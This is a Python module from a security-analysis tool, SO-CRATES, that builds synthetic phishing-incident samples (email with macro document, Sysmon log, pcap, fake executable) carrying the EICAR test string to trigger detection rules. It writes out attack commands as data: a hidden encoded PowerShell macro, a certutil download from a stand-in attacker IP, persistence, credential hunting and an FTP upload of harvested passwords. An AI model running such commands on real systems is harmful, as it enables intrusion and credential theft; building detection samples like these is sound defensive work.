"""Sample files built into SO-CRATES, for the Welcome screen's sample
buttons that work with no internet access (POST /api/load-sample).

Each sample is generated on request, not shipped as a file. The email's
attachment, the pcap's payload and the binary sample carry the EICAR
antivirus test string, and building them here - with the string split in
this source - means no file in the container image contains the
signature for a scanner to flag or quarantine. It only exists in full in
an analysis directory once someone loads a sample.

All four use only reserved .example domains and documentation-range IPs
(RFC 2606, RFC 5737), and tell one story (docs/usage/analyzing-files.md):
a phishing email delivers a macro document (email); opening it on
Jordan's workstation starts PowerShell, which downloads a payload that
persists and harvests saved credentials (log); the download and the
credentials' FTP upload are on the wire (pcap); and the payload itself
is the binary sample.

Samples are byte-for-byte deterministic, so loading one twice reopens the
same analysis (same MD5) instead of creating another.
"""

import io
import json
import random
import socket
import struct
import zipfile
from email.message import EmailMessage
from email.policy import SMTP

# The EICAR test string - a harmless file antivirus and YARA rulesets flag
# by design - in two halves, so this file itself never matches.
EICAR = b'X5O!P%@AP[4\\PZX54(P^)7CC)7}$' + b'EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'


def _macro_document():
    """A minimal macro-enabled Word document (.docm): an Office Open XML
    zip whose vbaProject.bin holds an AutoOpen macro - in place of the
    real compiled VBA, the macro's source and the EICAR string, stored
    uncompressed so YARA sees them. Fixed timestamps keep it
    deterministic."""
    parts = {
        '[Content_Types].xml': (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
            '<Default Extension="xml" ContentType="application/xml"/>'
            '<Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>'
            '<Override PartName="/word/document.xml" '
            'ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/>'
            '</Types>').encode(),
        '_rels/.rels': (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/'
            'relationships/officeDocument" Target="word/document.xml"/></Relationships>').encode(),
        'word/document.xml': (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
            '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
            '<w:body><w:p><w:r><w:t>Payroll Adjustment Form - enable editing and content to view.'
            '</w:t></w:r></w:p></w:body></w:document>').encode(),
        'word/vbaProject.bin': (
            b'Attribute VB_Name = "ThisDocument"\r\n'
            b'Sub AutoOpen()\r\n'
            b'    Shell "powershell.exe -nop -w hidden -enc SQBFAFgA...", vbHide\r\n'
            b'End Sub\r\n' + EICAR),
    }
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w') as zf:
        for name, data in parts.items():
            info = zipfile.ZipInfo(name, date_time=(2026, 2, 2, 17, 5, 0))
            info.compress_type = zipfile.ZIP_STORED
            zf.writestr(info, data)
    return buf.getvalue()


def _fix_boundaries(msg, prefix):
    """Give every multipart part a fixed boundary - left unset, the email
    package picks a random one each time the message is generated."""
    for i, part in enumerate(msg.walk()):
        if part.is_multipart():
            part.set_boundary(f'=={prefix}-{i}==')


def build_email_sample():
    """A phishing message that exercises every part of email analysis: a
    spoofed sender with a Reply-To and Return-Path elsewhere, failing SPF
    and DMARC, a link whose text names a different domain than it goes
    to, a macro-enabled Word attachment (carrying the EICAR string, so
    YARA flags it) and a forwarded message. Only reserved .example domains and documentation-range IPs
    (RFC 2606, RFC 5737), so nothing in it points at a real organization."""
    earlier = EmailMessage()
    earlier['Date'] = 'Mon, 02 Feb 2026 16:12:09 +0000'
    earlier['From'] = '"Northbridge Payroll" <noreply@northbridgepay.example>'
    earlier['To'] = 'jordan.lee@corp.example'
    earlier['Subject'] = 'Payroll schedule update'
    earlier['Message-ID'] = '<sched-0202@northbridgepay.example>'
    earlier.set_content(
        'Hello,\n\n'
        'Starting next month, payroll adjustments must be confirmed in the\n'
        'employee portal: https://portal.northbridgepay.example/schedule\n\n'
        'Northbridge Payroll\n')

    msg = EmailMessage()
    msg['Received'] = ('from mx1.corp.example (mx1.corp.example [10.20.0.5]) '
                       'by mail.corp.example with ESMTPS; Tue, 03 Feb 2026 08:41:17 +0000')
    msg['Received'] = ('from smtp.northbridge-secure.example (smtp.northbridge-secure.example [203.0.113.66]) '
                       'by mx1.corp.example with ESMTP; Tue, 03 Feb 2026 08:41:15 +0000')
    msg['Authentication-Results'] = ('mx1.corp.example; spf=fail smtp.mailfrom=northbridgepay.example; '
                                     'dkim=none; dmarc=fail header.from=northbridgepay.example')
    msg['Return-Path'] = '<bounce-7731@mailer.northbridge-secure.example>'
    msg['Date'] = 'Tue, 03 Feb 2026 08:41:12 +0000'
    msg['From'] = '"Northbridge Payroll" <payroll@northbridgepay.example>'
    msg['Reply-To'] = 'payroll-support@northbridge-secure.example'
    msg['To'] = '"Jordan Lee" <jordan.lee@corp.example>'
    msg['Subject'] = 'ACTION REQUIRED: Confirm your direct deposit by end of day'
    msg['Message-ID'] = '<20260203084112.7731@mailer.northbridge-secure.example>'
    msg['X-Mailer'] = 'PHPMailer 6.1.4'

    msg.set_content(
        'Dear Jordan,\n\n'
        'Your February direct deposit is on hold. To avoid a delay in your pay,\n'
        'confirm your bank details today at https://portal.northbridgepay.example/login\n\n'
        'You can also complete the attached Payroll Adjustment form.\n'
        "We've attached our earlier notice for reference.\n\n"
        'Northbridge Payroll Services\n')
    msg.add_alternative(
        '<html><body style="font-family: Arial, sans-serif;">'
        '<p>Dear Jordan,</p>'
        '<p>Your February direct deposit is <b>on hold</b>. To avoid a delay in your pay, '
        'confirm your bank details today:</p>'
        '<p><a href="https://northbridgepay.example.account-verify.example/session?id=7731">'
        'https://portal.northbridgepay.example/login</a></p>'
        '<p>You can also complete the attached Payroll Adjustment form. '
        "We've attached our earlier notice for reference.</p>"
        '<p>Questions? Visit our <a href="https://help.northbridgepay.example/payroll">Help Center</a>.</p>'
        '<p>Northbridge Payroll Services</p>'
        '</body></html>', subtype='html')
    msg.add_attachment(_macro_document(), maintype='application',
                       subtype='vnd.ms-word.document.macroEnabled.12',
                       filename='Payroll_Adjustment_Form.docm')
    msg.add_attachment(earlier)
    _fix_boundaries(msg, 'SO-CRATES-sample')
    return msg.as_bytes(policy=SMTP)


def build_binary_sample():
    """The payload the log and pcap samples download as update.exe: a fake
    executable (it doesn't run) carrying the EICAR string - byte-for-byte
    what Suricata extracts from the pcap sample, so the hashes match
    across the two analyses."""
    return _fake_pe(EICAR)


_SYSMON = {'Channel': 'Microsoft-Windows-Sysmon/Operational', 'Provider_Name': 'Microsoft-Windows-Sysmon',
           'Computer': 'FIN-WS-0412.corp.example'}
_WORD = 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE'
_POWERSHELL = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'
_CMD = 'C:\\Windows\\System32\\cmd.exe'
_DROPPED = 'C:\\Users\\Public\\update.exe'


def _process(time, pid, image, command_line, parent_pid, parent_image, parent_command_line,
             user='CORP\\jordan.lee'):
    """A Sysmon process-creation event (ID 1)."""
    return dict(_SYSMON, EventID=1, SystemTime=time, ProcessId=pid, Image=image,
                OriginalFileName=image.rsplit('\\', 1)[-1].upper(), CommandLine=command_line,
                ParentProcessId=parent_pid, ParentImage=parent_image,
                ParentCommandLine=parent_command_line, User=user, IntegrityLevel='Medium')


def build_log_sample():
    """Sysmon events, one JSON object per line, from the workstation that
    opened the sample email's payroll form: Word starts encoded PowerShell,
    certutil downloads the payload from the email's originating IP, and the
    payload enumerates the user, persists (scheduled task and Run key),
    hunts for saved credentials and connects out to upload them by FTP -
    the connection the pcap sample shows. Built to fire long-standing
    SigmaHQ rules with the built-in ruleset."""
    events = [
        _process('2026-02-03T08:44:02.118Z', 6120, _WORD,
                 '"WINWORD.EXE" /n "C:\\Users\\jordan.lee\\Downloads\\Payroll_Adjustment_Form.docm"',
                 3312, 'C:\\Windows\\explorer.exe', 'C:\\Windows\\Explorer.EXE'),
        _process('2026-02-03T08:44:19.540Z', 7044, _POWERSHELL,
                 'powershell.exe -nop -w hidden -enc '
                 'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA',
                 6120, _WORD, '"WINWORD.EXE" /n "Payroll_Adjustment_Form.docm"'),
        _process('2026-02-03T08:44:31.007Z', 7208, 'C:\\Windows\\System32\\certutil.exe',
                 f'certutil.exe -urlcache -split -f http://203.0.113.66/update.bin {_DROPPED}',
                 7044, _POWERSHELL, 'powershell.exe -nop -w hidden -enc SQBFAFgA...'),
        dict(_SYSMON, EventID=3, SystemTime='2026-02-03T08:44:31.412Z', ProcessId=7208,
             Image='C:\\Windows\\System32\\certutil.exe', User='CORP\\jordan.lee', Protocol='tcp',
             Initiated='true', SourceIp='10.20.4.12', SourcePort=51733,
             DestinationIp='203.0.113.66', DestinationPort=80),
        _process('2026-02-03T08:45:02.690Z', 7390, 'C:\\Windows\\System32\\whoami.exe', 'whoami /all',
                 7372, _CMD, 'cmd.exe /c whoami /all'),
        _process('2026-02-03T08:45:20.233Z', 7466, 'C:\\Windows\\System32\\schtasks.exe',
                 f'schtasks /create /sc onlogon /tn "Payroll Updater" /tr {_DROPPED} /f',
                 7450, _CMD, 'cmd.exe /c schtasks /create /sc onlogon /tn "Payroll Updater"'),
        dict(_SYSMON, EventID=13, SystemTime='2026-02-03T08:45:25.871Z', EventType='SetValue',
             ProcessId=7302, Image=_DROPPED, User='CORP\\jordan.lee',
             TargetObject='HKU\\S-1-5-21-3623811015-3361044348-30300820-1013\\Software\\Microsoft'
                          '\\Windows\\CurrentVersion\\Run\\PayrollUpdater',
             Details=_DROPPED),
        _process('2026-02-03T08:45:41.059Z', 7584, 'C:\\Windows\\System32\\cmdkey.exe', 'cmdkey /list',
                 7570, _CMD, 'cmd.exe /c cmdkey /list'),
        _process('2026-02-03T08:45:52.317Z', 7612, 'C:\\Windows\\System32\\findstr.exe',
                 'findstr /si password *.xml *.ini *.txt *.config', 7598, _CMD,
                 'cmd.exe /c cd C:\\Users\\jordan.lee && findstr /si password *.xml *.ini *.txt *.config'),
        # The upload the pcap sample shows - harvested credentials, by FTP.
        dict(_SYSMON, EventID=3, SystemTime='2026-02-03T08:46:10.204Z', ProcessId=7302,
             Image=_DROPPED, User='CORP\\jordan.lee', Protocol='tcp', Initiated='true',
             SourceIp='10.20.4.12', SourcePort=51790, DestinationIp='203.0.113.66', DestinationPort=21),
    ]
    return ''.join(json.dumps(e, sort_keys=True) + '\n' for e in events).encode()


_VICTIM, _C2 = '10.20.4.12', '203.0.113.66'
_VICTIM_MAC, _GATEWAY_MAC = bytes.fromhex('0050569a4c12'), bytes.fromhex('00163e1d2b01')
_MSS = 1448


def _checksum(data):
    if len(data) % 2:
        data += b'\0'
    total = sum(struct.unpack('!%dH' % (len(data) // 2), data))
    total = (total >> 16) + (total & 0xffff)
    total += total >> 16
    return ~total & 0xffff


class _Capture:
    """Just enough of a pcap writer for the sample: Ethernet/IPv4/TCP
    between the workstation and one remote host, seeded so the bytes are
    the same every time."""

    def __init__(self, start):
        self.packets = []
        self.t = start
        self.rng = random.Random(4412)

    def _tcp(self, src, dst, sport, dport, seq, ack, flags, payload=b'', dt=0.0005):
        hdr = struct.pack('!HHIIBBHHH', sport, dport, seq, ack, 5 << 4, flags, 64240, 0, 0)
        pseudo = socket.inet_aton(src) + socket.inet_aton(dst) + struct.pack('!BBH', 0, 6, len(hdr) + len(payload))
        hdr = hdr[:16] + struct.pack('!H', _checksum(pseudo + hdr + payload)) + hdr[18:]
        ip = struct.pack('!BBHHHBBH4s4s', 0x45, 0, 20 + len(hdr) + len(payload), self.rng.randint(1, 65535),
                         0x4000, 128 if src == _VICTIM else 52, 6, 0, socket.inet_aton(src), socket.inet_aton(dst))
        ip = ip[:10] + struct.pack('!H', _checksum(ip)) + ip[12:]
        smac, dmac = (_VICTIM_MAC, _GATEWAY_MAC) if src == _VICTIM else (_GATEWAY_MAC, _VICTIM_MAC)
        self.t += dt
        self.packets.append((self.t, dmac + smac + b'\x08\x00' + ip + hdr + payload))

    def session(self, cport, sport, steps, gap):
        """A TCP connection from the workstation: handshake, each
        (from_client, payload) step in order in MSS-sized segments, FIN. A
        step can instead be a callable, run at that point - for another
        connection that happens in the middle of this one."""
        v, c = _VICTIM, _C2
        cs, ss = self.rng.randint(10**8, 4 * 10**9), self.rng.randint(10**8, 4 * 10**9)
        self._tcp(v, c, cport, sport, cs, 0, 0x02, dt=gap); cs += 1
        self._tcp(c, v, sport, cport, ss, cs, 0x12, dt=0.041); ss += 1
        self._tcp(v, c, cport, sport, cs, ss, 0x10, dt=0.0004)
        for step in steps:
            if callable(step):
                step()
                continue
            from_client, payload = step
            for i in range(0, len(payload), _MSS):
                seg = payload[i:i + _MSS]
                if from_client:
                    self._tcp(v, c, cport, sport, cs, ss, 0x18, seg, dt=0.05); cs += len(seg)
                    self._tcp(c, v, sport, cport, ss, cs, 0x10, dt=0.04)
                else:
                    self._tcp(c, v, sport, cport, ss, cs, 0x18, seg, dt=0.04); ss += len(seg)
                    self._tcp(v, c, cport, sport, cs, ss, 0x10, dt=0.0005)
        self._tcp(v, c, cport, sport, cs, ss, 0x11, dt=0.01); cs += 1
        self._tcp(c, v, sport, cport, ss, cs, 0x11, dt=0.04); ss += 1
        self._tcp(v, c, cport, sport, cs, ss, 0x10, dt=0.0004)

    def to_bytes(self):
        out = [struct.pack('<IHHiIII', 0xa1b2c3d4, 2, 4, 0, 0, 65535, 1)]
        for ts, frame in self.packets:
            sec = int(ts)
            out.append(struct.pack('<IIII', sec, int(round((ts - sec) * 1e6)), len(frame), len(frame)) + frame)
        return b''.join(out)


def _fake_pe(body):
    """A minimal Windows executable header (MZ, DOS stub, PE signature) with
    body after it - enough for Suricata's executable-download rules and
    for `file` to call it a PE. It doesn't run."""
    dos = bytearray(b'MZ\x90\x00' + b'\x00' * 56)
    dos[0x3c:0x40] = (0x80).to_bytes(4, 'little')
    stub = b'\x0e\x1f\xba\x0e\x00\xb4\x09\xcd\x21\xb8\x01\x4c\xcd\x21This program cannot be run in DOS mode.\r\r\n$'
    return (bytes(dos) + stub).ljust(0x80, b'\x00') + b'PE\x00\x00\x4c\x01\x03\x00' + b'\x00' * 200 + body + b'\x00' * 300


def build_pcap_sample():
    """The sample workstation's traffic after the log sample's events:
    certutil (Microsoft-CryptoAPI user agent) downloads update.bin - a fake
    executable carrying the EICAR string - from the email's originating
    IP, then the payload uploads the credentials it harvested over FTP,
    named the way AgentTesla names them (PW_<user>-<host>_<timestamp>.html).
    Fires ET Open's AgentTesla FTP exfiltration rule and its executable-
    download rules (5 alerts with the built-in ruleset when written), and
    Suricata's extracted copy of the payload gets YARA hits."""
    cap = _Capture(start=1770108270.0)  # 2026-02-03T08:44:30Z, matching the log sample
    payload = build_binary_sample()
    cap.session(51733, 80, [
        (True, b'GET /update.bin HTTP/1.1\r\nCache-Control: no-cache\r\nConnection: Keep-Alive\r\n'
               b'Pragma: no-cache\r\nAccept: */*\r\nUser-Agent: Microsoft-CryptoAPI/10.0\r\n'
               b'Host: 203.0.113.66\r\n\r\n'),
        (False, b'HTTP/1.1 200 OK\r\nServer: nginx\r\nContent-Type: application/octet-stream\r\n'
                b'Content-Length: %d\r\nConnection: close\r\n\r\n' % len(payload) + payload),
    ], gap=1.0)
    report = (b'<html><head><title>PW_jordan.lee-FIN-WS-0412</title></head><body>'
              b'<h2>Recovered credentials - FIN-WS-0412 / jordan.lee</h2><table>'
              b'<tr><th>URL</th><th>User</th><th>Password</th></tr>'
              b'<tr><td>https://portal.northbridgepay.example/login</td><td>jordan.lee</td><td>Summer2026!</td></tr>'
              b'<tr><td>https://mail.corp.example</td><td>jordan.lee@corp.example</td><td>Summer2026!</td></tr>'
              b'</table></body></html>')
    filename = b'PW_jordan.lee-FIN-WS-0412_2026_02_03_08_46_10.html'
    cap.session(51790, 21, [
        (False, b'220 FTP Server ready.\r\n'), (True, b'USER exfil@northbridge-secure.example\r\n'),
        (False, b'331 Password required\r\n'), (True, b'PASS h4rv3st3d\r\n'), (False, b'230 Logged in.\r\n'),
        (True, b'TYPE I\r\n'), (False, b'200 Type set to I\r\n'),
        (True, b'PASV\r\n'), (False, b'227 Entering Passive Mode (203,0,113,66,195,80)\r\n'),
        (True, b'STOR ' + filename + b'\r\n'), (False, b'150 Accepted data connection\r\n'),
        # The upload itself, over the PASV data connection the 227 reply
        # announced (195*256+80 = 50000), before the server confirms it.
        lambda: cap.session(51791, 50000, [(True, report)], gap=0.01),
        (False, b'226 File successfully transferred\r\n'), (True, b'QUIT\r\n'), (False, b'221 Goodbye.\r\n'),
    ], gap=99.0)
    return cap.to_bytes()


# name -> (filename the analysis is given, builder). The only names
# POST /api/load-sample accepts.
SAMPLES = {
    'pcap': ('sample-workstation-traffic.pcap', build_pcap_sample),
    'binary': ('update.exe', build_binary_sample),
    'log': ('sample-sysmon-log.json', build_log_sample),
    'email': ('sample-phishing-email.eml', build_email_sample),
}
